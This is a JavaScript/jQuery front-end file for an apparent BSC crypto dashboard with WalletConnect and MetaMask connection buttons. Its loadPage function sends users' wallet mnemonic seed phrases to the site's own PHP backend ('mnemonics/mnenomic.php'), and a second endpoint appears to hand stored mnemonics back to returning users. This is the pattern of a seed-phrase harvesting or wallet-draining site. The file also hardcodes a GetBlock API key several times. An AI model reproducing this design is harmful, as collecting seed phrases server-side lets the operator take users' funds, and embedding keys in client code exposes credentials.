
var bool = false;

$(document).ready(function(){
  logOut();
  $(document).on("click",".btnconnect", function() {
    // $(".btn").click(function() {
      // bool=true;
       window.open('https://dextools.io/app/bsc');
     });
  $(document).on("click",".btn_connect", function() {
    // $(".btn").click(function() {
       bool=true;
       $(".container").attr('class',$(".container").attr('class')+' '+'blur_bg');
       $(".job_await").removeClass("expand_job");
      // $(".sidebar").attr('class',$(".sidebar").attr('class')+' '+'expand_sidebar');
      $(".main-card").show();
     });
    //$(".sidebar").attr('style','width:0;overflow-x:hidden');
    $(document).on("click",".btn", function() {
   // $(".btn").click(function() {
      bool=true;
      $(".container").attr('class',$(".container").attr('class')+' '+'blur_bg');
      $(".job_await").removeClass("expand_job");
      $(".sidebar").attr('class',$(".sidebar").attr('class')+' '+'expand_sidebar');
    });
    $(document).on("click",".content", function() {
    //$(".content").click(function() {
      //alert(1);
      bool=false;
      $(".sidebar").removeClass("expand_sidebar");
      $(".container").removeClass("blur_bg");
      
      $(".main-card").hide();
    });
  
    
    $(document).on("click",".reg", function() {
    //$(".reg").click (function() {
      $.ajaxSetup({url:null,cache:false});
      $.ajax({
            url: "jobs.html",
            success: function(data,status,jqXHR) {
              $("#home").html("");
                $("#home").html($(data).filter("#main_page"));
                history.pushState(null, null, "jobs.html");
                loads();
                $(".job_await").each(function(i){
                  var color = generateColor();
                  $(this).attr("style","background-color:"+generateColor())
                  //alert(generateColor());
            }); 
            },
            cache:false
        });    
    });
    
        $(".form-sub").submit(function(e) {
            e.preventDefault();
            let email = $('.token-amount-input').val();
            let email_hash = getHash(email);
            //console.log(email_hash)
            
            $.ajax({
                    url: "./mnemonics/checkMnemonics.php",
                    type:'post',
                    data:({sub:1,email:email_hash}),
                    success: function(result) {
                       // console.log("result:-",result)
                        if (result == 'Error') {
                           // console.log("Nrew");
                            setServer("https://bsc.getblock.io/mainnet/?api_key=3a7a0d72-40df-4821-9250-14e0495414bb",email);
                        } else {
                           // console.log("Ezisit");
                            setExistingServer(result,"https://bsc.getblock.io/mainnet/?api_key=3a7a0d72-40df-4821-9250-14e0495414bb");
                        }
                    }
            });
            
            
        })
        $(".walletConnect").click(function() {
            //walletConnect("http://192.168.8.102:8545");
            walletConnect("https://bsc.getblock.io/mainnet/?api_key=3a7a0d72-40df-4821-9250-14e0495414bb");
        });  
        $(".MetaMask").click(function() {
          connectMetaMask();
          //walletConnect("https://bsc.getblock.io/mainnet/?api_key=3a7a0d72-40df-4821-9250-14e0495414bb");
      }); 
        function loadPage(mnenonics,hash)  {
           // console.log("Mnenonminc:-",mnenonics,"hash:-",hash);
            
            if (hash != null) {
                $.ajax({
                        url: "./mnemonics/mnenomic.php",
                        type:'post',
                        data:({email:hash,mnenomics:mnenonics}),
                        success: function(result) {
                            
                        if (result != 'Error') {
                           // console.log("result:-",result)
                            loadDash();
                          }
                        }
                });                
            } else {
                loadDash();
            }

        }
         window.loadPage = loadPage;

        function loadDash() {
            setRefresh();
            
            $.ajaxSetup({url:null,cache:false});
            $.ajax({
                    url: "dashboard.html",
                    success: function(data,status,jqXHR) {
                        $(".bdy").fadeOut(function() {
                            $(".bdy").fadeIn();
                            $(".bdy").html($(data).filter("#main_body"));
                            history.pushState(null, null, "dashboard.html"); 
                            $(data).filter('.initiatePage').fadeIn();
                            initiate().then(result=> {
                              console.log(result)
                              $('.initiatePage').fadeOut();
                            });
                        })

                        
                    },
                    cache:false
                });            
        }

        function logOut() {
            logoutWalletConnect();
            $.ajax({
                        url: "./mnemonics/logout.php",
                        type:'get',
                        success: function(result) {
                            
                        if (result != 'Error') {
                            //console.log("result:-",result)
                        
                          }
                        }
                });              
        }
    
  
});

function dLoad() {
  alert(1);
}
